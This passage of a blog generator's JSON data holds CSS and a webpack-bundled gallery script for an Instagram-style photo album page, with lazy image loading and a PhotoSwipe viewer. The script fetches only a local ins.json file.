0;\n\twidth: 25%;\n\tposition: relative;\n\tpadding-bottom: 25%;\n}\n.instagram .album li:before{\n\tdisplay: none;\n}\n.instagram .album div.img-box{\n\tposition: absolute;\n\twidth: 90%;\n\theight: 90%;\n\t-webkit-box-shadow: 0 1px 0 rgba(255,255,255,0.4), 0 1px 0 1px rgba(255,255,255,0.1);\n\t-moz-box-shadow: 0 1px 0 rgba(255,255,255,0.4), 0 1px 0 1px rgba(255,255,255,0.1);\n\tbox-shadow: 0 1px 0 rgba(255,255,255,0.4), 0 1px 0 1px rgba(255,255,255,0.1);\n}\n.instagram .album div.img-box img{\n\twidth: 100%;\n\theight: 100%;\n    position: absolute;\n    z-index: 2;\n}\n.instagram .album div.img-box .img-bg{\n\tposition: absolute;\n\ttop: 0;\n\tleft: 0;\n\tbottom: 0px;\n\twidth: 100%;\n\tmargin: -5px;\n\tpadding: 5px;\n\t-webkit-box-shadow: 0 0 0 1px rgba(0,0,0,.04), 0 1px 5px rgba(0,0,0,0.1);\n\t-moz-box-shadow: 0 0 0 1px rgba(0,0,0,.04), 0 1px 5px rgba(0,0,0,0.1);\n\tbox-shadow: 0 0 0 1px rgba(0,0,0,.04), 0 1px 5px rgba(0,0,0,0.1);\n\t-webkit-transition: all 0.15s ease-out 0.1s;\n\t-moz-transition: all 0.15s ease-out 0.1s;\n\t-o-transition: all 0.15s ease-out 0.1s;\n\ttransition: all 0.15s ease-out 0.1s;\n\topacity: 0.2;\n\tcursor: pointer;\n\tdisplay: block;\n\tz-index: 3;\n}\n.instagram .album div.img-box .icon {\n    font-size: 14px;\n    position: absolute;\n    left: 50%;\n    top: 50%;\n    margin-left: -7px;\n    margin-top: -7px;\n    color: #999;\n    z-index: 1;\n}\n.instagram .album div.img-box .img-bg:hover{\n\topacity: 0;\n}\n.photos-btn-wrap {\n\tborder-bottom: 1px solid #e5e5e5;\n\tmargin-bottom: 20px;\n}\n.photos-btn {\n\tfont-size: 16px;\n\tcolor: #333;\n\tmargin-bottom: -4px;\n\tpadding: 5px 8px 3px;\n}\n.photos-btn.active {\n\tcolor: #08c;\n\tborder: 1px solid #e5e5e5;\n\tborder-bottom: 5px solid #fff;\n}\n\n@media screen and (max-width:600px) {\n\t.instagram .thumb {\n\t\twidth: 50%;\n\t\tpadding-bottom: 50%;\n\t}\n\t.instagram .album li {\n\t\twidth: 100%;\n\t\tposition: relative;\n\t\tpadding-bottom: 100%;\n\t\ttext-align: center;\n\t}\n\t.instagram .album div.img-box{\n\t\tmargin: 0;\n\t\twidth: 90%;\n\t\theight: 90%;\n\t}\n}","site":{"data":{}},"excerpt":"","more":"#post-instagram{\n\tpadding: 30px;\n}\n#post-instagram .article-entry{\n\tpadding-right: 0;\n}\n.instagram{\n\tposition: relative;\n\tmin-height: 500px;\n}\n.instagram img {\n\twidth: 100%;\n}\n.instagram .year {\n\tfont-size: 16px;\n}\n.instagram .open-ins{\n\tpadding: 10px 0;\n\tcolor: #cdcdcd;\n}\n.instagram .open-ins:hover{\n\tcolor: #657b83;\n}\n.instagram .year{\n\tdisplay: inline;\n}\n.instagram .thumb {\n\twidth: 25%;\n\theight: 0;\n\tpadding-bottom: 25%;\n\tposition: relative;\n\tdisplay: inline-block;\n\ttext-align: center;\n\tbackground: #ededed;\n}\n.instagram .thumb a {\n\tposition: relative;\n}\n.instagram .album h1 em{\n\tfont-style: normal;\n\tfont-size: 14px;\n\tmargin-left: 10px;\n}\n.instagram .album ul{\n\tdisplay: flex;\n\tflex-wrap: wrap;\n\tclear: both;\n\twidth: 100%;\n\ttext-align: left;\n}\n.instagram .album li{\n\tlist-style: none;\n\tdisplay: inline-block;\n\tbox-sizing: border-box;\n\tpadding: 0 5px;\n\tmargin-bottom: -10px;\n\theight: 0;\n\twidth: 25%;\n\tposition: relative;\n\tpadding-bottom: 25%;\n}\n.instagram .album li:before{\n\tdisplay: none;\n}\n.instagram .album div.img-box{\n\tposition: absolute;\n\twidth: 90%;\n\theight: 90%;\n\t-webkit-box-shadow: 0 1px 0 rgba(255,255,255,0.4), 0 1px 0 1px rgba(255,255,255,0.1);\n\t-moz-box-shadow: 0 1px 0 rgba(255,255,255,0.4), 0 1px 0 1px rgba(255,255,255,0.1);\n\tbox-shadow: 0 1px 0 rgba(255,255,255,0.4), 0 1px 0 1px rgba(255,255,255,0.1);\n}\n.instagram .album div.img-box img{\n\twidth: 100%;\n\theight: 100%;\n    position: absolute;\n    z-index: 2;\n}\n.instagram .album div.img-box .img-bg{\n\tposition: absolute;\n\ttop: 0;\n\tleft: 0;\n\tbottom: 0px;\n\twidth: 100%;\n\tmargin: -5px;\n\tpadding: 5px;\n\t-webkit-box-shadow: 0 0 0 1px rgba(0,0,0,.04), 0 1px 5px rgba(0,0,0,0.1);\n\t-moz-box-shadow: 0 0 0 1px rgba(0,0,0,.04), 0 1px 5px rgba(0,0,0,0.1);\n\tbox-shadow: 0 0 0 1px rgba(0,0,0,.04), 0 1px 5px rgba(0,0,0,0.1);\n\t-webkit-transition: all 0.15s ease-out 0.1s;\n\t-moz-transition: all 0.15s ease-out 0.1s;\n\t-o-transition: all 0.15s ease-out 0.1s;\n\ttransition: all 0.15s ease-out 0.1s;\n\topacity: 0.2;\n\tcursor: pointer;\n\tdisplay: block;\n\tz-index: 3;\n}\n.instagram .album div.img-box .icon {\n    font-size: 14px;\n    position: absolute;\n    left: 50%;\n    top: 50%;\n    margin-left: -7px;\n    margin-top: -7px;\n    color: #999;\n    z-index: 1;\n}\n.instagram .album div.img-box .img-bg:hover{\n\topacity: 0;\n}\n.photos-btn-wrap {\n\tborder-bottom: 1px solid #e5e5e5;\n\tmargin-bottom: 20px;\n}\n.photos-btn {\n\tfont-size: 16px;\n\tcolor: #333;\n\tmargin-bottom: -4px;\n\tpadding: 5px 8px 3px;\n}\n.photos-btn.active {\n\tcolor: #08c;\n\tborder: 1px solid #e5e5e5;\n\tborder-bottom: 5px solid #fff;\n}\n\n@media screen and (max-width:600px) {\n\t.instagram .thumb {\n\t\twidth: 50%;\n\t\tpadding-bottom: 50%;\n\t}\n\t.instagram .album li {\n\t\twidth: 100%;\n\t\tposition: relative;\n\t\tpadding-bottom: 100%;\n\t\ttext-align: center;\n\t}\n\t.instagram .album div.img-box{\n\t\tmargin: 0;\n\t\twidth: 90%;\n\t\theight: 90%;\n\t}\n}"},{"_content":"/******/\n(function(modules) { // webpackBootstrap\n  /******/ // The module cache\n  /******/\n  var installedModules = {};\n  /******/\n  /******/ // The require function\n  /******/\n  function __webpack_require__(moduleId) {\n    /******/\n    /******/ // Check if module is in cache\n    /******/\n    if (installedModules[moduleId])\n    /******/\n      return installedModules[moduleId].exports;\n    /******/\n    /******/ // Create a new module (and put it into the cache)\n    /******/\n    var module = installedModules[moduleId] = {\n      /******/\n      exports: {},\n      /******/\n      id: moduleId,\n      /******/\n      loaded: false\n        /******/\n    };\n    /******/\n    /******/ // Execute the module function\n    /******/\n    modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n    /******/\n    /******/ // Flag the module as loaded\n    /******/\n    module.loaded = true;\n    /******/\n    /******/ // Return the exports of the module\n    /******/\n    return module.exports;\n    /******/\n  }\n  /******/\n  /******/\n  /******/ // expose the modules object (__webpack_modules__)\n  /******/\n  __webpack_require__.m = modules;\n  /******/\n  /******/ // expose the module cache\n  /******/\n  __webpack_require__.c = installedModules;\n  /******/\n  /******/ // __webpack_public_path__\n  /******/\n  __webpack_require__.p = \"/dist/\";\n  /******/\n  /******/ // Load entry module and return exports\n  /******/\n  return __webpack_require__(0);\n  /******/\n})\n/************************************************************************/\n/******/\n([\n  /* 0 */\n  /***/\n  function(module, exports, __webpack_require__) {\n\n    'use strict';\n\n    __webpack_require__(1);\n\n    var _view = __webpack_require__(2);\n\n    var _view2 = _interopRequireDefault(_view);\n\n    function _interopRequireDefault(obj) {\n      return obj && obj.__esModule ? obj : {\n        default: obj\n      };\n    }\n\n    /**\n     * @name impush-client \n     * @description 这个项目让我发家致富…\n     * @date 2016-12-1\n     */\n\n    var _collection = [];\n    var _count = 0;\n    var searchData;\n\n    function addMask(elem) {\n      var rect = elem.getBoundingClientRect();\n      var style = getComputedStyle(elem, null);\n\n      var mask = document.createElement('i');\n      mask.className = 'icon-film';\n      mask.style.color = '#fff';\n      mask.style.fontSize = '26px';\n      mask.style.position = 'absolute';\n      mask.style.right = '10px';\n      mask.style.bottom = '10px';\n      mask.style.zIndex = 1;\n      elem.parentNode.appendChild(mask);\n    }\n\n    var createVideoIncon = function createVideoIncon() {\n      var $videoImg = document.querySelectorAll('.thumb a[data-type=\"video\"]');\n      for (var i = 0, len = $videoImg.length; i < len; i++) {\n        addMask($videoImg[i]);\n      }\n    };\n    var render = function render(res) {\n      var ulTmpl = \"\";\n      for (var j = 0, len2 = res.list.length; j < len2; j++) {\n        var data = res.list[j].arr;\n        var liTmpl = \"\";\n        for (var i = 0, len = data.link.length; i < len; i++) {\n          var minSrc = './minins/' + data.link[i] + '.min.jpg';\n          var src = './ins/' + data.link[i];\n          var type = 'images';\n\t\t  var sizes = data.sizes[i];\n\t\t  src += '.jpg';\n          var target = src;\n\n          liTmpl += '<figure class=\"thumb\" itemprop=\"associatedMedia\" itemscope=\"\">\\\n                <a href=\"' + src + '\" data-size=\"' + sizes + '\" data-type=\"' + type + '\" data-target=\"' + target + '\">\\\n                  <img class=\"reward-img\" data-type=\"' + type + '\" src=\"' + minSrc + '\" itemprop=\"thumbnail\" onload=\"lzld(this)\">\\\n                </a>\\\n                <figcaption style=\"display:none\" itemprop=\"caption description\">' + data.text[i] + '</figcaption>\\\n            </figure>';\n        }\n        ulTmpl = ulTmpl + '<section class=\"archives album\"><h1 class=\"year\">' + data.year + '<em>' + data.month + '月</em></h1>\\\n        <ul class=\"img-box-ul\">' + liTmpl + '</ul>\\\n        </section>';\n      }\n      document.querySelector('.instagram').innerHTML = '<div class=\"photos\" itemscope=\"\">' + ulTmpl + '</div>';\n      createVideoIncon();\n      _view2.default.init();\n    };\n\n    var replacer = function replacer(str) {\n      var arr = str.split(\"/\");\n      return \"/assets/ins/\" + arr[arr.length - 1];\n    };\n\n    var ctrler = function ctrler(data) {\n      var imgObj = {};\n      for (var i = 0, len = data.length; i < len; i++) {\n        var y = data[i].y;\n        var m = data[i].m;\n        var src = replacer(data[i].src);\n        var text = data[i].text;\n        var key = y + \"\" + ((m + \"\").length == 1 ? \"0\" + m : m);\n        if (imgObj[key]) {\n          imgObj[key].srclist.push(src);\n          imgObj[key].text.push(text);\n        } else {\n          imgObj[key] = {\n            year: y,\n            month: m,\n            srclist: [src],\n            text: [text]\n          };\n        }\n      }\n      render(imgObj);\n    };\n\n    function loadData(success) {\n      if (!searchData) {\n        var xhr = new XMLHttpRequest();\n        xhr.open('GET', './ins.json?t=' + +new Date(), true);\n\n        xhr.onload = function() {\n          if (this.status >= 200 && this.status < 300) {\n            var res = JSON.parse(this.response);\n            searchData = res;\n            success(searchData);\n          } else {\n            console.error(this.statusText);\n          }\n        };\n\n        xhr.onerror = function() {\n          console.error(this.statusText);\n        };\n\n        xhr.send();\n      } else {\n        success(searchData);\n      }\n    }\n\n    var Ins = {\n      init: function init() {\n        loadData(function(data) {\n          render(data);\n        });\n      }\n    };\n\n    Ins.init();\n\n    // export default impush;\n\n    /***/\n  },\n  /* 1 */\n  /***/\n  function(module, exports, __webpack_require__) {\n\n    /* WEBPACK VAR INJECTION */\n    (function(global) {\n      'use strict';\n\n      var inViewport = __webpack_require__(3);\n      var lazyAttrs = ['data-src'];\n\n      global.lzld = lazyload();\n\n      // Provide libs using getAttribute early to get the good src\n      // and not the fake data-src\n      replaceGetAttribute('Image');\n      replaceGetAttribute('IFrame');\n\n      function registerLazyAttr(attr) {\n        if (indexOf.call(lazyAttrs, attr) === -1) {\n          lazyAttrs.push(attr);\n        }\n      }\n\n      function lazyload(opts) {\n        opts = merge({\n          'offset': 333,\n          'src': 'data-src',\n          'container': false\n        }, opts || {});\n\n        if (typeof opts.src === 'string') {\n          registerLazyAttr(opts.src);\n        }\n\n        var elts = [];\n\n        function show(elt) {\n          var src = findRealSrc(elt);\n\n          if (src) {\n            elt.src = src;\n          }\n\n          elt.setAttribute('data-lzled', true);\n          elts[indexOf.call(elts, elt)] = null;\n        }\n\n        function findRealSrc(elt) {\n          if (typeof opts.src === 'function') {\n            return opts.src(elt);\n          }\n\n          return elt.getAttribute(opts.src);\n        }\n\n        function register(elt) {\n          elt.onload = null;\n          elt.removeAttribute('onload');\n          elt.onerror = null;\n          elt.removeAttribute('onerror');\n\n          if (indexOf.call(elts, elt) === -1) {\n            inViewport(elt, opts, show);\n          }\n        }\n\n        return register;\n      }\n\n      function replaceGetAttribute(elementName) {\n        var fullname = 'HTML' + elementName + 'Element';\n        if (fullname in global === false) {\n          return;\n        }\n\n        var original = global[fullname].prototype.getAttribute;\n        global[fullname].prototype.getAttribute = function(name) {\n          if (name === 'src') {\n            var realSrc;\n            for (var i = 0, max = lazyAttrs.length; i < max; i++) {\n              realSrc = original.call(this, lazyAttrs[i]);\n              if (realSrc) {\n                break;\n              }\n            }\n\n            return realSrc || original.call(this, name);\n          }\n\n          // our own lazyloader will go through theses lines\n          // because we use getAttribute(opts.src)\n          return original.call(this, name);\n        };\n      }\n\n      function merge(defaults, opts) {\n        for (var name in defaults) {\n          if (opts[name] === undefined) {\n            opts[name] = defaults[name];\n          }\n        }\n\n        return opts;\n      }\n\n      // http://webreflection.blogspot.fr/2011/06/partial-polyfills.html\n      function indexOf(value) {\n        for (var i = this.length; i-- && this[i] !== value;) {}\n        return i;\n      }\n\n      module.exports = lazyload;\n\n      // export default impush;\n      /* WEBPACK VAR INJECTION */\n    }.call(exports, (function() {\n      return this;\n    }())))\n\n    /***/\n  },\n  /* 2 */\n  /***/\n  function(module, exports) {\n\n    'use strict';\n\n    var initPhotoSwipeFromDOM = function initPhotoSwipeFromDOM(gallerySelector) {\n\n      // parse slide data (url, title, size ...) from DOM elements \n      // (children of gallerySelector)\n      var parseThumbnailElements = function parseThumbnailElements(el) {\n        el = el.parentNode.parentNode;\n        var thumbElements = el.getElementsByClassName('thumb'),\n          numNodes = thumbElements.length,\n          items = [],\n          figureEl,\n          linkEl,\n          size,\n          type,\n          // video or not\n          target,\n          item;\n\n        for (var i = 0; i < numNodes; i++) {\n\n          figureEl = thumbElements[i]; // \n\n          // include only element nodes \n          if (figureEl.nodeType !== 1) {\n            continue;\n          }\n\n          linkEl = figureEl.children[0]; // \n\n          size = linkEl.getAttribute('data-size').split('x');\n          type = linkEl.getAttribute('data-type');\n          target = linkEl.getAttribute('data-target');\n          // create slide object\n          item = {\n            src: linkEl.getAttribute('href'),\n            w: parseInt(size[0], 10),\n            h: parseInt(size[1], 10)\n          };\n\n          if (figureEl.children.length > 1) {\n            item.title = figureEl.children[1].innerHTML;\n          }\n\n          if (linkEl.children.length > 0) {\n            item.msrc = linkEl.children[0].getAttribute('src');\n            item.type = type;\n            item.target = target;\n            item.html = '<video src=\"' + target + '\" controls=\"controls\" autoplay=\"autoplay\"></video>';\n            if (type === 'video') {\n              //item.src = null;\n            }\n          }\n\n          item.el = figureEl; // save link to element for getThumbBoundsFn\n          items.push(item);\n        }\n\n        return items;\n      };\n\n      // find nearest parent element\n      var closest = function closest(el, fn) {\n        return el && (fn(el) ? el : closest(el.parentNode, fn));\n      };\n\n      // triggers when user clicks on thumbnail\n      var onThumbnailsClick = function onThumbnailsClick(e) {\n        e = e || window.event;\n        e.preventDefault ? e.preventDefault() : e.returnValue = false;\n\n        var eTarget = e.target || e.srcElement;\n\n        // find root element of slide\n        var clickedListItem = closest(eTarget, function(el) {\n          return el.tagName && el.tagName.toUpperCase() === 'FIGURE';\n        });\n\n        if (!clickedListItem) {\n          return;\n        }\n\n        // find index of clicked item by looping through all child nodes\n        // alternatively, you may define index via data- attribute\n        var clickedGallery = clickedListItem.parentNode,\n\n          // childNodes = clickedListItem.parentNode.childNodes,\n          // numChildNodes = childNodes.length,\n          childNodes = document.getElementsByClassName('thumb'),\n          numChildNodes = childNodes.length,\n          nodeIndex = 0,\n          index;\n\n        for (var i = 0; i < numChildNodes; i++) {\n          if (childNodes[i].nodeType !== 1) {\n            continue;\n          }\n\n          if (childNodes[i] === clickedListItem) {\n            index = nodeIndex;\n            break;\n          }\n          nodeIndex++;\n        }\n\n        if (index >= 0) {\n          // open PhotoSwipe if valid index found\n          openPhotoSwipe(index, clickedGallery);\n        }\n        return false;\n      };\n\n      // parse picture index and gallery index from URL (#&pid=1&gid=2)\n      var photoswipeParseHash = function photoswipeParseHash() {\n        var hash = window.location.hash.substring(1),\n          params = {};\n\n        if (hash.length < 5) {\n          return params;\n        }\n\n        var vars = hash.split('&');\n        for (var i = 0; i < vars.length; i++) {\n          if (!vars[i]) {\n            continue;\n          }\n          var pair = vars[i].split('=');\n          if (pair.length < 2) {\n            continue;\n          }\n          params[pair[0]] = pair[1];\n        }\n\n        if (params.gid) {\n          params.gid = parseInt(params.gid, 10);\n        }\n\n        return params;\n      };\n\n      var openPhotoSwipe = function openPhotoSwipe(index, galleryElement, disableAnimation, fromURL) {\n        var pswpElement = document.querySelectorAll('.pswp')[0],\n          gallery,\n          options,\n          items;\n\n        items = parseThumbnailElements(galleryElement);\n        // define options (if needed)\n        options = {\n\n          // define gallery index (for URL)\n          galleryUID: galleryElement.getAttribute('data-pswp-uid'),\n\n          getThumbBoundsFn: function getThumbBoundsFn(index) {\n            // See Options -> getThumbBoundsFn section of documentation for more info\n            var thumbnail = items[index].el.getElementsByTagName('img')[0],\n              // find thumbnail\n              pageYScroll = window.pageYOffset || document.documentElement.scrollTop,\n              rect = thumbnail.getBoundingClientRect();\n\n            return {\n              x: rect.left,\n              y: rect.top + pageYScroll,\n              w: rect.width\n            };\n          }\n\n        };\n\n        // PhotoSwipe opened from URL\n        if (fromURL) {\n          if (options.galleryPIDs) {\n            // parse real index when custom PIDs are used \n            // http://photoswipe.com/documentation/faq.html#custom-pid-in-url\n            for (var j = 0; j < items.length; j++) {\n              if (items[j].pid == index) {\n                options.index = j;\n                break;\n              }\n            }\n          } else {\n            // in URL indexes start from 1\n            options.index = parseInt(index, 10) - 1;\n          }\n        } else {\n          options.index = parseInt(index, 10);\n        }\n\n        // exit if index not found\n        if (isNaN(options.index)) {\n          return;\n        }\n\n        if (disableAnimation) {\n          options.showAnimationDuration = 0;\n        }\n\n        // Pass data to PhotoSwipe and initialize it\n        gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, options);\n        gallery.init();\n\n        var $tempVideo;\n        var stopVideoHandle = function stopVideoHandle() {\n          if ($tempVideo) {\n            $tempVideo.remove();\n            $tempVideo = null;\n          }\n        };\n        var changeHandle = function changeHandle() {\n          var item = gallery.currItem;\n          stopVideoHandle();\n          if (item.type === 'video') {\n            var $ctn = item.container;\n            var style = $ctn.getElementsByClassName('pswp__img')[0].style;\n            var $video = document.createElement('video');\n            $video.setAttribute('autoplay', 'autoplay');\n            $video.setAttribute('controls', 'controls');\n            $video.setAttribute('src', item.target);\n            $video.style.width = style.width;\n            $video.style.height = style.height;\n            $video.style.position = 'absolute';\n            $video.style.zIndex = 2;\n            $tempVideo = $video;\n            $ctn.appendChild($video);\n          }\n        };\n        gallery.listen('initialZoomIn', changeHandle);\n        gallery.listen('afterChange', changeHandle);\n        gallery.listen('initialZoomOut', stopVideoHandle);\n      };\n\n      // loop through all gallery elements and bind events\n      var galleryElements = document.querySelectorAll(gallerySelector);\n      for (var i = 0, l = galleryElements.length; i < l; i++) {\n        galleryElements[i].setAttribute('data-pswp-uid', i + 1);\n        galleryElements[i].onclick = onThumbnailsClick;\n      }\n\n      // Parse URL and open gallery if it contains #&pid=3&gid=1\n      var hashData = photoswipeParseHash();\n      if (hashData.pid && hashData.gid) {\n        openPhotoSwipe(hashData.pid, galleryElements[hashData.gid - 1], true, true);\n      }\n    };\n\n    var Viewer = function() {\n      function init() {\n        initPhotoSwipeFromDOM('.photos');\n      }\n      return {\n        init: init\n      };\n    }();\n\n    module.exports = Viewer;\n\n    /***/\n  },\n  /* 3 */\n  /***/\n  function(module, exports) {\n\n    /* WEBPACK VAR INJECTION */\n    (function(global) {\n      module.exports = inViewport;\n\n      var instances = [];\n      var supportsMutationObserver = typeof global.MutationObserver === 'function';\n\n      function inViewport(elt, params, cb) {\n        var opts = {\n          container: global.document.body,\n          offset: 0\n        };\n\n        if (params === undefined || typeof params === 'function') {\n          cb = params;\n          params = {};\n        }\n\n        var container = opts.container = params.container || opts.container;\n        var offset = opts.offset = params.offset || opts.offset;\n\n        for (var i = 0; i < instances.length; i++) {\n          if (instances[i].container === container) {\n            return instances[i].isInViewport(elt, offset, cb);\n          }\n        }\n\n        return instances[\n          instances.push(createInViewport(container)) - 1\n        ].isInViewport(elt, offset, cb);\n      }\n\n      function addEvent(el, type, fn) {\n        if (el.attachEvent) {\n          el.attachEvent('on' + type, fn);\n        } else {\n          el.addEventListener(type, fn, false);\n        }\n      }\n\n      function debounce(func, wait, immediate) {\n        var timeout;\n        return function() {\n          var context = this,\n            args = arguments;\n          var callNow = immediate && !timeout;\n          clearTimeout(timeout);\n          timeout = setTimeout(later, wait);\n          if (callNow) func.apply(context, args);\n\n          function later() {\n            timeout = null;\n            if (!immediate) func.apply(context, args);\n          }\n        };\n      }\n\n      // https://github.com/jquery/sizzle/blob/3136f48b90e3edc84cbaaa6f6f7734ef03775a07/sizzle.js#L708\n      var contains = function() {\n        if (!global.document) {\n          return true;\n        }\n        return global.document.documentElement.compareDocumentPosition ?\n          function(a, b) {\n            return !!(a.compareDocumentPosition(b) & 16);\n          } :\n          global.document.documentElement.contains ?\n          function(a, b) {\n            return a !== b && (a.contains ? a.contains(b) : false);\n          } :\n          function(a, b) {\n            while (b = b.parentNode) {\n              if (b === a) {\n                return true;\n              }\n            }\n            return false;\n          };\n      }\n\n      function createInViewport(container) {\n        var watches = createWatches();\n\n        var scrollContainer = container === global.document.body ? global : container;\n        var debouncedCheck = debounce(watches.checkAll(watchInViewport), 15);\n\n        addEvent(scrollContainer, 'scroll', debouncedCheck);\n\n        if (scrollContainer === global) {\n          addEvent(global, 'resize', debouncedCheck);\n        }\n\n        if (supportsMutationObserver) {\n          observeDOM(watches, container, debouncedCheck);\n        }\n\n        // failsafe check, every 200ms we check for visible images\n        // usecase: a hidden parent containing eleements\n        // when the parent becomes visible, we have no event that the children\n        // became visible\n        setInterval(debouncedCheck, 150);\n\n        function isInViewport(elt, offset, cb) {\n          if (!cb) {\n            return isVisible(elt, offset);\n          }\n\n          var remote = createRemote(elt, offset, cb);\n          remote.watch();\n          return remote;\n        }\n\n        function createRemote(elt, offset, cb) {\n          function watch() {\n            watches.add(elt, offset, cb);\n          }\n\n          function dispose() {\n            watches.remove(elt);\n          }\n\n          return {\n            watch: watch,\n            dispose: dispose\n          };\n        }\n\n        function watchInViewport(elt, offset, cb) {\n          if (isVisible(elt, offset)) {\n            watches.remove(elt);\n            cb(elt);\n          }\n        }\n\n        function isVisible(elt, offset) {\n          if (!contains(global.document.documentElement, elt) || !contains(global.document.documentElement, container)) {\n            return false;\n          }\n\n          // Check if the element is visible\n          // https://github.com/jquery/jquery/blob/740e190223d19a114d5373758127285d14d6b71e/src/css/hiddenVisibleSelectors.js\n          if (!elt.offsetWidth || !elt.offsetHeight) {\n            return false;\n          }\n\n          var eltRect = elt.getBoundingClientRect();\n          var viewport = {};\n\n          if (container === global.document.body) {\n            viewport = {\n              top: -offset,\n              left: -offset,\n              right: global.document.documentElement.clientWidth + offset,\n              bottom: global.document.documentElement.clientHeight + offset\n            };\n          } else {\n            var containerRect = container.getBoundingClientRect();\n            viewport = {\n              top: containerRect.top - offset,\n              left: containerRect.left - offset,\n              right: containerRect.right + offset,\n              bottom: containerRect.bottom + offset\n            };\n          }\n\n          // The element must overlap with the visible part of the viewport\n          var visible =\n            (\n              (eltRect.right > viewport.left) &&\n              (eltRect.left < viewport.right) &&\n              (eltRect.bottom > viewport.top) &&\n              (eltRect.top < viewport.bottom)\n            );\n\n          return visible;\n        }\n\n        return {\n          container: container,\n          isInViewport: isInViewport\n        };\n      }\n\n      function createWatches() {\n        var watches = [];\n\n        function add(elt, offset, cb) {\n          if (!isWatched(elt)) {\n            watches.push([elt, offset, cb]);\n          }\n        }\n\n        function remove(elt) {\n          var pos = indexOf(elt);\n          if (pos !== -1) {\n            watches.splice(pos, 1);\n          }\n        }\n\n        function indexOf(elt) {\n          for (var i = watches.length - 1; i >= 0; i--) {\n            if (watches[i][0] === elt) {\n              return i;\n            }\n          }\n          return -1;\n        }\n\n        function isWatched(elt) {\n          return indexOf(elt) !== -1;\n        }\n\n        function checkAll(cb) {\n          return function() {\n            for (var i = watches.length - 1; i >= 0; i--) {\n              cb.apply(this, watches[i]);\n            }\n          };\n        }\n\n        return {\n          add: add,\n          remove: remove,\n          isWatched: isWatched,\n          checkAll: checkAll\n        };\n      }\n\n      function observeDOM(watches, container, cb) {\n        var observer = new MutationObserver(watch);\n        var filter = Array.prototype.filter;\n        var concat = Array.prototype.concat;\n\n        observer.observe(container, {\n          childList: true,\n          subtree: true,\n          // changes like style/width/height/display will be catched\n          attributes: true\n        });\n\n        function watch(mutations) {\n          // some new DOM nodes where previously watched\n          // we should check their positions\n          if (mutations.some(knownNodes) === true) {\n            setTimeout(cb, 0);\n          }\n        }\n\n        function knownNodes(mutation) {\n          var nodes = concat.call([],\n            Array.prototype.slice.call(mutation.addedNodes),\n            mutation.target\n          );\n          return filter.call(nodes, watches.isWatched).length > 0;\n        }\n      }\n\n      /* WEBPACK VAR INJECTION */\n    }.call(exports, (function() {\n      return this;\n    }())))\n\n    /***/\n  }\n  /******/\n]);","source":"photos/ins.js","raw":"/******/\n(function(modules) { // webpackBootstrap\n  /******/ // The module cache\n  /******/\n  var installedModules = {};\n  /******/\n  /******/ // The require function\n  /******/\n  function __webpack_require__(moduleId) {\n    /******/\n    /******/ // Check if module is in cache\n    /******/\n    if (installedModules[moduleId])\n    /******/\n      return installedModules[moduleId].exports;\n    /******/\n    /******/ // Create a new module (and put it into the cache)\n    /******/\n    var module = installedModules[moduleId] = {\n      /******/\n      exports: {},\n      /******/\n      id: moduleId,\n      /******/\n      loaded: false\n        /******/\n    };\n    /******/\n    /******/ // Execute the module function\n    /******/\n    modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n    /******/\n    /******/ // Flag the module as loaded\n    /******/\n    module.loaded = true;\n    /******/\n    /******/ // Return the exports of the module\n    /******/\n    return module.exports;\n    /******/\n  }\n  /******/\n  /******/\n  /******/ // expose the modules object (__webpack_modules__)\n  /******/\n  __webpack_require__.m = modules;\n  /******/\n  /******/ // expose the module cache\n  /******/\n  __webpack_require__.c = installedModules;\n  /******/\n  /******/ // __webpack_public_path__\n  /******/\n  __webpack_require__.p = \"/dist/\";\n  /******/\n  /******/ // Load entry module and return exports\n  /******/\n  return __webpack_require__(0);\n  /******/\n})\n/************************************************************************/\n/******/\n([\n  /* 0 */\n  /***/\n  function(module, exports, __webpack_require__) {\n\n    'use strict';\n\n    __webpack_require__(1);\n\n    var _view = __webpack_require__(2);\n\n    var _view2 = _interopRequireDefault(_view);\n\n    function _interopRequireDefault(obj) {\n      return obj && obj.__esModule ? obj : {\n        default: obj\n      };\n    }\n\n    /**\n     * @name impush-client \n     * @description 这个项目让我发家致富…\n     * @date 2016-12-1\n     */\n\n    var _collection = [];\n    var _count = 0;\n    var searchData;\n\n    function addMask(elem) {\n      var rect = elem.getBoundingClientRect();\n      var style = getComputedStyle(elem, null);\n\n      var mask = document.createElement('i');\n      mask.className = 'icon-film';\n      mask.style.color = '#fff';\n      mask.style.fontSize = '26px';\n      mask.style.position = 'absolute';\n      mask.style.right = '10px';\n      mask.style.bottom = '10px';\n      mask.style.zIndex = 1;\n      elem.parentNode.appendChild(mask);\n    }\n\n    var createVideoIncon = function createVideoIncon() {\n      var $videoImg = document.querySelectorAll('.thumb a[data-type=\"video\"]');\n      for (var i = 0, len = $videoImg.length; i < len; i++) {\n        addMask($videoImg[i]);\n      }\n    };\n    var render = function render(res) {\n      var ulTmpl = \"\";\n      for (var j = 0, len2 = res.list.length; j < len2; j++) {\n        var data = res.list[j].arr;\n        var liTmpl = \"\";\n        for (var i = 0, len = data.link.length; i < len; i++) {\n          var minSrc = './minins/' + data.link[i] + '.min.jpg';\n          var src = './ins/' + data.link[i];\n          var type = 'images';\n\t\t  var sizes = data.sizes[i];\n\t\t  src += '.jpg';\n          var target = src;\n\n          liTmpl += '<figure class=\"thumb\" itemprop=\"associatedMedia\" itemscope=\"\">\\\n                <a href=\"' + src + '\" data-size=\"' + sizes + '\" data-type=\"' + type + '\" data-target=\"' + target + '\">\\\n                  <img class=\"reward-img\" data-type=\"' + type + '\" src=\"' + minSrc + '\" itemprop=\"thumbnail\" onload=\"lzld(this)\">\\\n                </a>\\\n                <figcaption style=\"display:none\" itemprop=\"caption description\">' + data.text[i] + '</figcaption>\\\n            </figure>';\n        }\n        ulTmpl = ulTmpl + '<section class=\"archives album\"><h1 class=\"year\">' + data.year + '<em>' + data.month + '月</em></h1>\\\n        <ul class=\"img-box-ul\">' + liTmpl + '</ul>\\\n        </section>';\n      }\n      document.querySelector('.instagram').innerHTML = '<div class=\"photos\" itemscope=\"\">' + ulTmpl + '</div>';\n      createVideoIncon();\n      _view2.default.init();\n    };\n\n    var replacer = function replacer(str) {\n      var arr = str.split(\"/\");\n      return \"/assets/ins/\" + arr[arr.length - 1];\n    };\n\n    var ctrler = function ctrler(data) {\n      var imgObj = {};\n      for (var i = 0, len = data.length; i < len; i++) {\n        var y = data[i].y;\n        var m = data[i].m;\n        var src = replacer(data[i].src);\n        var text = 